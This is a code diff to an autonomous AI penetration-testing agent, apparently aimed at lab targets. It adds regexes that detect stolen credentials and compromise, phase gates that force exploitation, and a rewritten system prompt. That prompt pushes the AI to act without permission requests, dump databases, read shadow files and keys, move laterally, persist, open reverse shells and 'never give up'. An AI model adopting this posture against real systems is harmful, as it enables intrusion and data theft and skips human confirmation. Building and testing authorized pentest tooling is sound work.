@@ -9,6 +9,7 @@ import os
 import ipaddress
 import sys
 import json
+import shlex
 import subprocess
 import time
 from datetime import datetime, timezone
@@ -124,6 +125,62 @@ CONVERSATION TO SUMMARIZE:
 import re as _re_module
 import re
 
+# ── Feature 7: Exploitation Evidence Pattern Matching (PentAGI/PentestGPT P1) ─
+EXPLOITATION_EVIDENCE_PATTERNS = [
+    (re.compile(r'uid=\d+\('), "shell_access"),
+    (re.compile(r'root:x:0:0:'), "passwd_read"),
+    (re.compile(r'root:\$[156y]\$'), "shadow_read"),
+    (re.compile(r'\d+ rows? in set'), "mysql_data_dump"),
+    (re.compile(r'Changed database context to', re.I), "mssql_access"),
+    (re.compile(r'\(\d+ rows? affected\)'), "mssql_data"),
+    (re.compile(r'BEGIN RSA PRIVATE KEY'), "private_key"),
+    (re.compile(r'BEGIN OPENSSH PRIVATE KEY'), "ssh_key"),
+    (re.compile(r'session \d+ opened', re.I), "msf_session"),
+    (re.compile(r'Meterpreter session \d+', re.I), "meterpreter"),
+    (re.compile(r'NT AUTHORITY\\\\SYSTEM', re.I), "system_shell"),
+    # IMPORTANT: Don't treat web server banners (apache/nginx/httpd) as shell proof.
+    # Only count a web-shell style proof when we see actual command output for the web user.
+    # This avoids false positives from HTML pages that mention "www-data" (e.g. DVWA setup page).
+    (re.compile(r'uid=\d+\(www-data\)', re.I), "web_shell"),
+    (re.compile(r'CREATE TABLE|INSERT INTO|SELECT .+ FROM', re.I), "sql_output"),
+    # Require an actual assignment (":" or "=") to avoid matching HTML field names/types.
+    (re.compile(r'\bpassword\b\s*[:=]\s*["\']?\S{4,}', re.I), "password_found"),
+    (re.compile(r'token["\s:=]+ey[A-Za-z0-9]', re.I), "jwt_found"),
+    (re.compile(r'AWS_ACCESS_KEY|AKIA[A-Z0-9]{16}'), "aws_key"),
+    (re.compile(r'Authorization:\s*Bearer', re.I), "bearer_token"),
+]
+# ── End Feature 7 constant ───────────────────────────────────────────────────
+
+# ── Feature 3: Repeating Command Detector (PentAGI-inspired) ─────────────────
+class RepeatingDetector:
+    """Detect when the agent runs the same command 3+ times in a row."""
+    THRESHOLD = 3
+
+    def __init__(self):
+        self.history: list = []
+        self.total_repeats: int = 0
+
+    def check(self, command: str) -> bool:
+        normalized = self._normalize(command)
+        if not normalized:
+            return False
+        if not self.history or self.history[-1] != normalized:
+            self.history = [normalized]
+            return False
+        self.history.append(normalized)
+        if len(self.history) >= self.THRESHOLD:
+            self.total_repeats += 1
+            self.history = []
+            return True
+        return False
+
+    def _normalize(self, cmd: str) -> str:
+        lines = cmd.strip().split('\n')
+        # Remove echo/comment lines, keep actual commands
+        filtered = [l for l in lines if l.strip() and not l.strip().startswith('echo ') and not l.strip().startswith('#')]
+        return '\n'.join(filtered).strip()
+# ── End Feature 3 class ──────────────────────────────────────────────────────
+
 ARTIFACT_PATTERNS = {
     "credentials": [
         # JSON credentials: {"username":"X","password":"Y"}
@@ -134,6 +191,12 @@ ARTIFACT_PATTERNS = {
         _re_module.compile(r'Authorization:\s*Basic\s+(\S+)', _re_module.IGNORECASE),
         # /etc/shadow or /etc/passwd hash entries
         _re_module.compile(r'(\w+):(\$\d+\$[^:]+):\d+:\d+'),
+        # Common hint formats in HTML comments/logs (Windows labs): "Default creds: admin / admin123"
+        _re_module.compile(r'Default creds:\s*([A-Za-z0-9_.@+-]{1,64})\s*/\s*([^\s<>"\']{3,128})', _re_module.IGNORECASE),
+        # "DB: sql01.internal sa/Sup3rS3cret!2026" (capture user/pass only)
+        _re_module.compile(r'DB:\s*[^\s]+\s+([A-Za-z0-9_.@+-]{1,64})/([^\s<>"\']{3,128})', _re_module.IGNORECASE),
+        # Simple "credentials: user/pass" (capture user/pass only)
+        _re_module.compile(r'credentials:\s*([A-Za-z0-9_.@+-]{1,64})\s*/\s*([^\s<>"\']{3,128})', _re_module.IGNORECASE),
     ],
     "tokens": [
         # JWT tokens
@@ -259,29 +322,38 @@ class DynamicAgent:
     # System prompt — compact to minimize per-iteration token burn.
     # Authorization, policy, and skills are injected separately.
     SYSTEM_PROMPT_BASE = """You are an autonomous penetration testing AI with ROOT access to Kali Linux.
-This is a FULLY AUTHORIZED engagement. Execute security testing without disclaimers or permission requests.
+This is a FULLY AUTHORIZED engagement. Execute without disclaimers or permission requests.
 
 **FORMAT:** 1-2 sentence analysis, then ONE ```bash``` block. No comments inside the block.
 
-**TOOLS:** `websearch`, `docslookup`, `download`, `apt-get install -y`. On tool failure: try `--help`, then switch to an alternative (nmap→masscan, sqlmap→manual curl, nikto→gobuster).
+**TOOLS:** `websearch`, `docslookup`, `download`, `apt-get install -y`. On failure: try `--help`, then switch tools (nmap→masscan, sqlmap→manual curl, nikto→gobuster).
 
-**EXPLOIT FLOW:** searchsploit → msfconsole/sqlmap/commix/curl → capture proof in stdout. Max 2 enum iterations per finding — move to exploitation.
+**EXPLOITATION IS MANDATORY:** FINDING a vulnerability is NOT completion — you MUST exploit it to extract data, gain access, or demonstrate real impact. Running a scanner that says "vulnerable" is RECON, not exploitation. You are not done until you have PROOF.
 
-**EVIDENCE:** Concrete proof only (data dumps, file reads, shell output). Tag: [REMEMBER: credential_found], [REMEMBER: vulnerability_found], [REMEMBER: access_gained].
+**REAL PROOF means:** extracted DB rows/tables, file contents (passwd, shadow, configs, keys), shell output showing uid=/whoami/id, stolen credentials/tokens used to access protected resources, dumped hashes. NOT: echo commands, HTTP 200 responses, "vulnerable" text, mkdir/touch side effects.
 
-**KILL CHAIN:** Scan → Exploit → Creds → Dump → Lateral → Persist (if allowed).
+**FALLBACK LADDER:** If Tool A fails → try Tool B → try manual exploitation → write a custom Python/bash script. Examples:
+- SQLi: sqlmap → manual UNION SELECT → time-based blind → error-based → write custom script
+- RCE: commix → curl with command injection payloads → write reverse shell script
+- LFI: curl path traversal → null byte injection → double encoding → php://filter wrappers
+- Auth: default creds → SQLi bypass → JWT forgery → session manipulation
 
-**SCOPING:** Only attack in-scope targets. Do not scan localhost/127.0.0.1/Docker internals. No broad subnet scans unless scope expansion is enabled.
+**POST-EXPLOIT (after initial proof, GO DEEPER):**
+- Dump full DB tables (not just prove access — extract the data)
+- Read sensitive files: /etc/shadow, .env, config files, private keys, backup files
+- Privesc: `sudo -l`, `find / -perm -4000`, `getcap -r /`, cron jobs, writable scripts, kernel version
+- Use discovered creds for lateral movement to other services/hosts
+- Extract maximum value before moving to next target
 
-**TARGET ROTATION:** After baseline recon + one exploit attempt + evidence, pivot to next in-scope target. After 3 consecutive failures, move on.
+**KILL CHAIN:** Scan → Exploit → Proof → Deepen → Lateral → Persist (if allowed).
 
-**POST-EXPLOIT:** `id`, `sudo -l`, `getcap -r /`, `find / -perm -4000`, container checks, config/secret/DB dumps, lateral movement with discovered creds.
+**SCOPING:** Only in-scope targets. No localhost/127.0.0.1/Docker internals. No broad subnet scans unless scope expansion enabled.
 
-**RECON LADDER:** Start with `nmap -F -n <target>`. Full-port scan only after baseline succeeds.
+**RECON LADDER:** `nmap -F -n <target>` first. Full-port only after baseline. Max 2 enum iterations per finding — then EXPLOIT.
 
-**MEMORY:** For [REMEMBER: vulnerability_found], include Evidence: with a proof snippet.
+**MEMORY:** Tag: [REMEMBER: credential_found], [REMEMBER: vulnerability_found], [REMEMBER: access_gained]. Include Evidence: with proof snippet.
 
-Vary your techniques. Do not repeat failed commands. Make progress.
+**NEVER GIVE UP:** Vary techniques on every attempt. If standard tools fail, write custom exploit scripts. Do not repeat failed commands verbatim. The vulnerability IS there — find the right exploitation path.
 """
 
     def __init__(self, log_dir: str = LOG_DIR, mitre_context: str = None, 
@@ -444,6 +516,65 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         except Exception:
             pass
 
+        # Structured findings store (persists outside chat history; never trimmed)
+        self.findings_store_path = os.path.join(self.log_dir, "structured_findings.json")
+        self.structured_findings: List[Dict[str, Any]] = []
+        if os.path.exists(self.findings_store_path):
+            try:
+                with open(self.findings_store_path, "r") as f:
+                    loaded_findings = json.load(f)
+                if isinstance(loaded_findings, list):
+                    self.structured_findings = loaded_findings
+            except Exception:
+                pass
+        self._sync_structured_findings_from_vuln_tracker()
+        self._save_structured_findings()
+
+        # Phase gate (RECON -> VULN_DISCOVERY -> EXPLOITATION -> POST_EXPLOIT)
+        self.phase_order = ["RECON", "VULN_DISCOVERY", "EXPLOITATION", "POST_EXPLOIT"]
+        self.phase_limits = {
+            "RECON": int(os.getenv("PHASE_RECON_MAX_STEPS", "5")),
+            "VULN_DISCOVERY": int(os.getenv("PHASE_VULN_DISCOVERY_MAX_STEPS", "5")),
+            "EXPLOITATION": int(os.getenv("PHASE_EXPLOITATION_MAX_STEPS", "15")),
+            "POST_EXPLOIT": int(os.getenv("PHASE_POST_EXPLOIT_MAX_STEPS", "5")),
+        }
+        self.phase_current = os.getenv("PHASE_GATE_START", "RECON").upper().strip()
+        if self.phase_current not in self.phase_order:
+            self.phase_current = "RECON"
+        self.phase_steps = {p: 0 for p in self.phase_order}
+        self.phase_gate_last_notice_iter = 0
+        self.phase_force_exploit = False
+        self.exploit_fail_fast_threshold = int(os.getenv("EXPLOIT_FAIL_FAST_THRESHOLD", "3"))
+        self.runtime_context_prefix = "**RUNTIME ENFORCEMENT CONTEXT**"
+        self.banned_loop_phrases = [
+            "let me scan more",
+            "given the complexity",
+            "let me run another scan",
+            "let me enumerate further",
+            "scan a bit more",
+            "need more scanning first",
+        ]
+
+        # access.json is the canonical "access gained" signal used by the control-plane live stats.
+        # Without it, runs can look like "proof only" even when exploitation succeeded.
+        self.access_json_path = os.path.join(self.log_dir, "access.json")
+
+        # Post-proof deepening hold: after proving an exploit, require follow-up impact actions
+        # (data extraction / sensitive file reads / privileged endpoint access) before pivoting away
+        # or returning to broad scanning. This prevents the chronic "15-30 vulns found, 0 exploited"
+        # / "proof-only" behavior.
+        self.post_proof_hold_min_actions = int(os.getenv("POST_PROOF_HOLD_MIN_ACTIONS", "2"))
+        self.post_proof_hold_max_blocks = int(os.getenv("POST_PROOF_HOLD_MAX_BLOCKS", "8"))
+        self.post_proof_hold_target = None  # normalized host token
+        self.post_proof_hold_vuln_id = None
+        self.post_proof_hold_actions = 0
+        self.post_proof_hold_blocks = 0
+        self.post_proof_hold_start_iteration = 0
+        # Auto-tracking guardrails (false-positive control).
+        self.auto_track_require_exploit_intent = os.getenv("AUTO_TRACK_REQUIRE_EXPLOIT_INTENT", "true").lower() in ("1", "true", "yes")
+        self.auto_track_broad_patterns = os.getenv("AUTO_TRACK_BROAD_PATTERNS", "false").lower() in ("1", "true", "yes")
+        self.auto_track_min_output_chars = int(os.getenv("AUTO_TRACK_MIN_OUTPUT_CHARS", "30"))
+
         # Mandatory exploitation gate: in autonomous exploit mode, require at least one exploit attempt per tracked vuln.
         self.enforce_exploit_gate = os.getenv("ENFORCE_EXPLOITATION_GATE", "true").lower() in ("1", "true", "yes")
         # Tight mode: require SUCCESS with PROOF, not just an attempt.
@@ -481,9 +612,17 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         try:
             exploit_mode = os.getenv("EXPLOIT_MODE", "explicit_only").lower()
             if self.enforce_exploit_gate and exploit_mode == "autonomous" and self._exploit_phase_active():
-                self.force_exploit_next = True
+                # Only force exploitation immediately when resuming with existing pending vulns.
+                pending = self._get_unproven_vulns() if self.enforce_exploit_proof else self._get_unattempted_vulns()
+                if pending:
+                    self.force_exploit_next = True
         except Exception:
             pass
+
+        # Hard scan blocking — prevent infinite nmap loops
+        self.scan_counts: Dict[str, int] = {}  # nmap/scan count per target
+        self.max_scans_per_target = int(os.getenv("MAX_SCANS_PER_TARGET", "5"))
+        self.auto_exploit_chains = os.getenv("AUTO_EXPLOIT_CHAINS", "true").lower() in ("1", "true", "yes")
 
         # Immediate exploit trigger (Spec 009)
         self.immediate_exploit_queue: List[str] = []  # vuln_ids pending immediate exploitation
@@ -495,7 +634,7 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         # Context summarization (Spec 008)
         self.context_digest = ""  # Running structured summary
         self.context_digest_path = os.path.join(self.log_dir, "context_digest.md")
-        self.max_digest_chars = int(os.getenv("MAX_DIGEST_CHARS", "2500"))
+        self.max_digest_chars = int(os.getenv("MAX_DIGEST_CHARS", "5000"))
         self.digest_trim_count = 0  # How many trims have enriched this digest
         # Load persisted digest on startup/resume
         if os.path.exists(self.context_digest_path):
@@ -554,6 +693,20 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             except Exception:
                 pass
         
+        # ── P1 Feature 1: Container Port Awareness ──
+        self.container_ports = [
+            p.strip() for p in os.getenv("CONTAINER_PORTS", "").split(",") if p.strip()
+        ]
+
+        # ── P1 Feature 2: Structured Completion Gate (Barrier Tool Pattern) ──
+        self.auto_complete_blocks = 0
+
+        # ── P1 Feature 3: Repeating Command Detector ──
+        self.repeating_detector = RepeatingDetector()
+
+        # ── P1 Feature 6: Self-Check Injection Interval ──
+        self.self_check_interval = int(os.getenv("SELF_CHECK_INTERVAL", "25"))
+
         # Target alias deduplication (hostname/IP aliasing)
         self.target_aliases: Dict[str, str] = {}
 
@@ -584,6 +737,26 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         
         if mitre_context:
             system_prompt += f"\n\n{mitre_context}"
+
+        # ── P1 Feature 1: Container Port Awareness ──
+        if self.container_ports:
+            ports_str = ", ".join(self.container_ports)
+            system_prompt += (
+                f"\n\nREVERSE SHELL PORTS: The following ports are bound from your container "
+                f"to the host and can receive connections: {ports_str}. "
+                f"Use these for reverse shells, bind shells, and listeners "
+                f"(e.g., `nc -lvnp {self.container_ports[0]}`)."
+            )
+        else:
+            system_prompt += (
+                "\n\nNo dedicated listener ports configured. "
+                "Use existing service ports or write files for data exfiltration."
+            )
+
+        # ── P1 Feature 5: Guide Persistence — load previous successful techniques ──
+        guides_section = self._load_guides()
+        if guides_section:
+            system_prompt += guides_section
         
         self.system_prompt = system_prompt
 
@@ -611,10 +784,59 @@ Vary your techniques. Do not repeat failed commands. Make progress.
     
     def _log(self, msg: str, level: str = "INFO"):
         timestamp = datetime.now(timezone.utc).isoformat()
+        # Always redact secrets in logs (JWTs, bearer tokens, passwords).
+        # This prevents leaks in both container stdout and persisted dynamic_agent.log.
+        try:
+            msg = self._redact_sensitive(str(msg))
+        except Exception:
+            msg = str(msg)
         log_line = f"[{timestamp}] [{level}] {msg}"
         print(log_line)
         with open(f"{self.log_dir}/dynamic_agent.log", 'a') as f:
             f.write(log_line + '\n')
+
+    def _normalize_llm_response_text(self, response) -> str:
+        """Normalize provider responses to a plain string.
+
+        Some SDKs return structured content blocks (e.g. a list of dicts) instead of a string.
+        Downstream code assumes a string (e.g. `.lower()`, length in chars).
+        """
+        if response is None:
+            return ""
+        if isinstance(response, str):
+            return response
+        if isinstance(response, list):
+            parts: List[str] = []
+            for item in response:
+                if item is None:
+                    continue
+                if isinstance(item, str):
+                    parts.append(item)
+                    continue
+                if isinstance(item, dict):
+                    text = item.get("text")
+                    if isinstance(text, str):
+                        parts.append(text)
+                        continue
+                    try:
+                        parts.append(json.dumps(item, ensure_ascii=True))
+                    except Exception:
+                        parts.append(str(item))
+                    continue
+                parts.append(str(item))
+            return "\n".join(parts)
+        if isinstance(response, dict):
+            for key in ("content", "text", "message"):
+                val = response.get(key)
+                if isinstance(val, str):
+                    return val
+                if isinstance(val, list):
+                    return self._normalize_llm_response_text(val)
+            try:
+                return json.dumps(response, ensure_ascii=True)
+            except Exception:
+                return str(response)
+        return str(response)
 
     def _load_supervisor_state(self):
         if os.path.exists(self.supervisor_hint_state_path):
@@ -826,6 +1048,7 @@ Vary your techniques. Do not repeat failed commands. Make progress.
             "COMMANDS TRIED & RESULTS",
             "FAILED APPROACHES (DO NOT RETRY)",
             "CURRENT PROGRESS",
+            "NEXT ACTIONS",
         ]
 
         def _parse_sections(text: str) -> Dict[str, List[str]]:
@@ -931,6 +1154,32 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         except Exception:
             pass
 
+        # NEXT ACTIONS: auto-generate from unproven vulns with concrete exploit commands
+        try:
+            if hasattr(self, 'vulns_found') and self.vulns_found:
+                next_action_lines = []
+                action_count = 0
+                for vid, v in self.vulns_found.items():
+                    if action_count >= 3:
+                        break
+                    if not isinstance(v, dict):
+                        continue
+                    if v.get("exploited") or v.get("not_exploitable_reason"):
+                        continue
+                    vtype = v.get("type", "unknown")
+                    vtarget = v.get("target", "?")
+                    vdetails = v.get("details", "")
+                    exploit_cmd = self._generate_auto_exploit_command(vtype, vtarget, vdetails) if hasattr(self, '_generate_auto_exploit_command') else None
+                    if exploit_cmd:
+                        next_action_lines.append(f"- EXPLOIT {vtype} at {vtarget}: `{exploit_cmd}`")
+                    else:
+                        next_action_lines.append(f"- EXPLOIT {vtype} at {vtarget} (find appropriate exploit tool)")
+                    action_count += 1
+                if next_action_lines:
+                    merged["NEXT ACTIONS"] = next_action_lines
+        except Exception:
+            pass
+
         # Reassemble
         parts = []
         for section_name in SECTION_ORDER:
@@ -992,6 +1241,131 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         except Exception:
             pass
 
+    # ── P1 Feature 5: Guide Persistence (Successful Techniques Storage) ────────
+
+    def _save_guide(self, vuln_record: dict, proof_command: str):
+        """Save a successful exploitation technique as a guide for future runs."""
+        guides_dir = os.environ.get("GUIDES_DIR", os.path.join(self.log_dir, "guides"))
+        try:
+            os.makedirs(guides_dir, exist_ok=True)
+            guide = {
+                "vuln_type": vuln_record.get("type", "unknown"),
+                "target_service": vuln_record.get("target", "unknown"),
+                "technique": (proof_command or "")[:500],
+                "tools_used": vuln_record.get("techniques_tried", []),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "success": True,
+            }
+            filename = f"guide_{vuln_record.get('type', 'unknown')}_{int(time.time())}.json"
+            filepath = os.path.join(guides_dir, filename)
+            with open(filepath, 'w') as f:
+                json.dump(guide, f, indent=2)
+            self._log(f"Guide saved: {filename}", "INFO")
+        except Exception as e:
+            self._log(f"Guide save failed: {e}", "WARN")
+
+    def _load_guides(self) -> str:
+        """Load existing guides and format as a system prompt section."""
+        guides_dir = os.environ.get("GUIDES_DIR", os.path.join(self.log_dir, "guides"))
+        if not os.path.isdir(guides_dir):
+            return ""
+        guides = []
+        try:
+            for f in sorted(os.listdir(guides_dir))[-10:]:  # Last 10 guides
+                try:
+                    with open(os.path.join(guides_dir, f)) as fh:
+                        g = json.load(fh)
+                        guides.append(
+                            f"- {g['vuln_type']} on {g['target_service']}: {g['technique'][:200]}"
+                        )
+                except Exception:
+                    pass
+        except Exception:
+            return ""
+        if not guides:
+            return ""
+        return "\n\nPREVIOUS SUCCESSFUL TECHNIQUES:\n" + "\n".join(guides)
+
+    # ── End Feature 5 Methods ────────────────────────────────────────────────
+
+    # ── P1 Feature 7: Exploitation Evidence Pattern Matching ─────────────────
+
+    # Known tool banner/help patterns that produce false positive evidence matches
+    _TOOL_BANNER_PATTERNS = [
+        re.compile(r'usage:\s+\w+', re.I),
+        re.compile(r'^\s*-{1,2}\w+\s+', re.M),  # CLI flag lines (e.g. --password <val>)
+        re.compile(r'metasploit\s+v?\d', re.I),
+        re.compile(r'nmap\s+\d+\.\d+', re.I),
+        re.compile(r'\[!\]\s+No results', re.I),
+        re.compile(r'help|HELP|--help|-h\b'),
+        re.compile(r'man\s+page|manual', re.I),
+        re.compile(r'Copyright\s+\(c\)', re.I),
+        re.compile(r'Licensed under', re.I),
+    ]
+
+    def _detect_exploitation_evidence(self, output: str, command: str = "") -> list:
+        """Scan command output for exploitation evidence patterns.
+
+        Filters out false positives from:
+        - The agent's own Kali environment
+        - HTML comments (<!-- ... -->) that contain discovery hints, not exploitation proof
+        - Tool banners, help text, and usage output
+        """
+        if not output:
+            return []
+
+        # BUG FIX: Strip HTML comments before pattern matching.
+        # HTML comments like <!-- Default creds: admin/password --> are discovery
+        # artifacts, not evidence of exploitation. They appear in curl/wget output
+        # of target pages but do not prove the target was exploited.
+        cleaned_output = re.sub(r'<!--.*?-->', '', output, flags=re.DOTALL)
+
+        # Also strip content inside HTML tags (e.g. <input type="password" ...>)
+        # which can match password patterns but are just page structure
+        cleaned_output = re.sub(r'<[^>]+>', ' ', cleaned_output)
+
+        # Detect if this is primarily tool help/banner output
+        _is_help_output = any(bp.search(output[:500]) for bp in self._TOOL_BANNER_PATTERNS)
+
+        evidence = []
+        cmd_lower = (command or "").lower()
+        target = (self.target or "").lower()
+
+        for pattern, evidence_type in EXPLOITATION_EVIDENCE_PATTERNS:
+            if pattern.search(cleaned_output):
+                # Filter: shell_access from local Kali commands (not targeting remote host)
+                if evidence_type in ("shell_access", "web_shell", "system_shell"):
+                    if target and target not in cmd_lower:
+                        remote_indicators = [target, "curl", "wget", "ssh", "nc ", "ncat", "nmap",
+                                             "crackmapexec", "hydra", "sqlmap", "msfconsole",
+                                             "impacket", "mssqlclient", "smbclient", "rpcclient",
+                                             "evil-winrm", "psexec", "wmiexec", "sshpass"]
+                        if not any(ind in cmd_lower for ind in remote_indicators):
+                            continue  # Skip - likely local Kali output
+
+                # Filter: password_found from echo/cat of agent's own files
+                if evidence_type == "password_found":
+                    if any(tok in cmd_lower for tok in ("echo ", "cat /pentest/", "tee ", "echo -e")):
+                        if target and target not in cmd_lower and "curl" not in cmd_lower and "wget" not in cmd_lower:
+                            continue  # Skip - agent echoing its own data
+
+                # Filter: sql_output from local SELECT in echo/heredoc
+                if evidence_type == "sql_output":
+                    if "echo " in cmd_lower or "cat <<" in cmd_lower or "heredoc" in cmd_lower:
+                        if target and target not in cmd_lower:
+                            continue
+
+                # BUG FIX: Weak evidence types require corroboration — skip if
+                # the output looks like tool help/banner text rather than target response.
+                if _is_help_output and evidence_type in ("password_found", "jwt_found", "bearer_token", "sql_output"):
+                    self._log(f"EVIDENCE FILTERED: {evidence_type} suppressed (tool help/banner output detected)", "DEBUG")
+                    continue
+
+                evidence.append(evidence_type)
+        return evidence
+
+    # ── End Feature 7 Methods ────────────────────────────────────────────────
+
     def _extract_artifacts(self, command: str, stdout: str, stderr: str) -> List[Tuple[str, Dict]]:
         """Extract reusable artifacts (creds, tokens, keys) from command output. Regex-only, no LLM."""
         import re
@@ -1036,6 +1410,18 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                         parts = value.split(":", 1)
                         uname = parts[0].strip().lower()
                         passwd = parts[1].strip() if len(parts) > 1 else ""
+                        # Reject obvious HTML/URL-encoded garbage (common false positives from SPA error pages).
+                        # Example bad values: "admin%27%20OR%201=1--&amp:x</title>"
+                        try:
+                            _bad_subs = ("</", "<", ">", "&", "amp;", "%3c", "%3e", "%2f", "%3d", "%27", "%22")
+                            if any(b in uname for b in _bad_subs) or any(b in passwd.lower() for b in _bad_subs):
+                                continue
+                            if "%" in uname and re.search(r"%[0-9a-f]{2}", uname):
+                                continue
+                            if "%" in passwd and re.search(r"%[0-9a-f]{2}", passwd):
+                                continue
+                        except Exception:
+                            pass
                         # Reject garbage words as usernames
                         _garbage_usernames = {
                             "evidence", "proof", "cat", "prefix", "dump", "passwords",
@@ -1430,8 +1816,10 @@ Vary your techniques. Do not repeat failed commands. Make progress.
                 # or if it's skipped (not_exploitable_reason set)
                 is_proven = v.get("exploited") and v.get("proof")
                 is_skipped = bool((v.get("not_exploitable_reason") or "").strip())
-                if is_proven or is_skipped:
-                    reason = "already proven" if is_proven else "marked not exploitable"
+                # IMPORTANT: Do NOT block post-exploit "deepening" actions after a vuln is proven.
+                # Only block vulns explicitly marked not exploitable (skip) to prevent loops.
+                if is_skipped:
+                    reason = "marked not exploitable"
                     return (
                         f"⚠️ {vtype.upper()} vuln at {v.get('target', '?')} is {reason}. "
                         f"Do NOT retry this vuln type. Move to a different vulnerability or discovery."
@@ -1712,6 +2100,10 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         # Scrub URLs and JWT-like tokens to avoid false hostname matches
         scrubbed = re.sub(r'https?://[^\s\'"]+', ' ', content)
         scrubbed = re.sub(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', ' ', scrubbed)
+        # Scrub JWT-like tokens even when truncated (common in logs/LLM outputs) so the
+        # embedded dots don't get mis-parsed as hostnames and trigger off-target/hold blocks.
+        # Example: TOKEN="eyJ...<snip>... .eyJ...<snip>" should not count as two "targets".
+        scrubbed = re.sub(r'eyJ[A-Za-z0-9_-]{10,}(?:\.[A-Za-z0-9_-]{10,}){1,2}', ' ', scrubbed)
         # Scrub python module invocations (e.g., `python3 -m json.tool`) which look like hostnames.
         scrubbed = re.sub(r'(\bpython[0-9.]*\b\s+-m\s+)[A-Za-z0-9_.-]+', r'\1', scrubbed)
 
@@ -1761,6 +2153,48 @@ Vary your techniques. Do not repeat failed commands. Make progress.
 
         return targets
 
+    def _primary_target_for_command(self, content: str) -> Optional[str]:
+        """Pick the primary in-scope target referenced by a command (preserves order).
+
+        In multi-target jobs, `self.target` may remain the initial engagement label even when
+        the LLM executes commands against other in-scope targets. Using the command-derived
+        target prevents mis-attributing findings (e.g., DVWA findings being recorded as JuiceShop).
+        """
+        if not content:
+            return None
+
+        try:
+            allowed = set(self._candidate_targets()) or set()
+        except Exception:
+            allowed = set()
+
+        import re
+
+        # 1) URLs in order of appearance
+        for m in re.finditer(r'https?://[^\s\'"]+', content):
+            try:
+                host = urlparse(m.group(0)).hostname
+            except Exception:
+                host = None
+            host_norm = self._normalize_target_token(host) if host else ""
+            if host_norm and (not allowed or host_norm in allowed):
+                return host_norm
+
+        # 2) Host:port / bare allowlist tokens (split by whitespace, keep order)
+        for tok in (content or "").split():
+            tok = tok.strip().strip("'\"")
+            if not tok or tok.startswith(("-", "/")):
+                continue
+            # Skip assignments/headers
+            if "=" in tok and not re.match(r'^[A-Za-z0-9.-]+:\d+$', tok):
+                continue
+            host_norm = self._normalize_target_token(tok)
+            if host_norm and host_norm not in ("localhost", "127.0.0.1", "0.0.0.0"):
+                if not allowed or host_norm in allowed:
+                    return host_norm
+
+        return None
+
     def _truncate_text(self, text: str, max_chars: int, head_lines: int = 80, tail_lines: int = 20) -> Tuple[str, bool]:
         """Trim long outputs while keeping head/tail for context."""
         if text is None:
@@ -1805,7 +2239,13 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         """Block command chaining or multiple commands in a single block unless explicitly allowed."""
         if os.getenv("ALLOW_COMMAND_CHAINING", "false").lower() in ("1", "true", "yes"):
             return None
-        cmd = (content or "")
+        cmd_raw = (content or "")
+        # Tolerate leading comments in code blocks. The model often emits:
+        #   # explanation
+        #   curl ...
+        # We should treat this as a single command, not "multiple commands".
+        _lines = cmd_raw.splitlines()
+        cmd = "\n".join([ln for ln in _lines if ln.strip() and not ln.lstrip().startswith("#")]).strip()
         lowered = cmd.lower()
 
         import re
@@ -1979,22 +2419,135 @@ Vary your techniques. Do not repeat failed commands. Make progress.
         remaining = [k.replace("_", " ") for k, v in self.recon_checklist.items() if not v]
         return f"📊 Recon {completed}/5 complete. Remaining: {', '.join(remaining)}."
 
+    @staticmethod
+    def _strip_llm_reasoning(text: str) -> str:
+        """Strip LLM internal monologue/reasoning from text, keeping only factual content.
+        
+        The LLM sometimes includes its thinking process in [REMEMBER:] tags, e.g.:
+        - "Wait, the user *provided* that output..."
+        - "Okay, so I have two things happening..."
+        - "Let me think about this..."
+        
+        This strips those patterns and keeps only technical/factual content.
+        Works on both multi-line and single-line inputs.
+        """
+        if not text:
+            return ""
+        import re
+        
+        # First pass: strip reasoning PREFIXES from text (even within single lines).
+        # These patterns match a reasoning sentence at the start, leaving the factual remainder.
+        prefix_patterns = [
+            # "Wait, ... ." or "Okay, so ... ."  — reasoning sentence followed by factual content
+            re.compile(r"(?i)^(?:wait|okay|ok|so|let me|hmm|alright|right|now|well|actually|thinking)[,.]?\s+.*?[.!?]\s+", re.DOTALL),
+            # "I need to/should/will/think ..." sentences
+            re.compile(r"(?i)^(?:I (?:need to|should|will|can|have to|notice|see|think|found|believe|realize))\s+.*?[.!?]\s+", re.DOTALL),
+            # "the user *provided* that output..." 
+            re.compile(r"(?i)^the user (?:\*?provided\*?|asked|wants|said)\s+.*?[.!?]\s+", re.DOTALL),
+        ]
+        
+        result = text
+        for pattern in prefix_patterns:
+            # Keep stripping prefixes until none match (handles chained reasoning)
+            for _ in range(3):  # Max 3 passes to avoid infinite loop
+                match = pattern.match(result)
+                if match:
+                    remainder = result[match.end():].strip()
+                    if remainder and len(remainder) >= 10:
+                        result = remainder
+                    else:
+                        break  # Don't strip if remainder is too short
+                else:
+                    break
+        
+        # Second pass: remove italicized internal thoughts (*thinking about this*)
+        result = re.sub(r'\*[^*]{3,}\*', '', result).strip()
+        
+        # Third pass: process multi-line — remove lines that are purely reasoning
+        line_reasoning_patterns = [
+            re.compile(r"(?i)^(?:wait|okay|ok|so|let me|hmm|alright|right|now|well|actually|thinking)[,.]?\s+"),
+            re.compile(r"(?i)^(?:I (?:need to|should|will|can|have to|notice|see|think|found|believe|realize))\s+"),
+            re.compile(r"(?i)^the user (?:\*?provided\*?|asked|wants|said)\s+"),
+        ]
+        
+        if '\n' in result:
+            lines = result.split('\n')
+            clean_lines = []
+            for line in lines:
+                stripped = line.strip()
+                if not stripped:
+                    continue
+                is_pure_reasoning = False
+                for pattern in line_reasoning_patterns:
+                    if pattern.match(stripped):
+                        # Check if the entire line is reasoning (no factual tail)
+                        cleaned = pattern.sub('', stripped).strip()
+                        if not cleaned or len(cleaned) < 10:
+                            is_pure_reasoning = True
+                            break
+                if not is_pure_reasoning:
+                    clean_lines.append(stripped)
+            if clean_lines:
+                result = '\n'.join(clean_lines)
+        
+        # If we stripped everything, return original (better than empty)
+        return result.strip() if result.strip() else text.strip()
+
     def _evidence_gate_ok(self, category: str, content: str) -> bool:
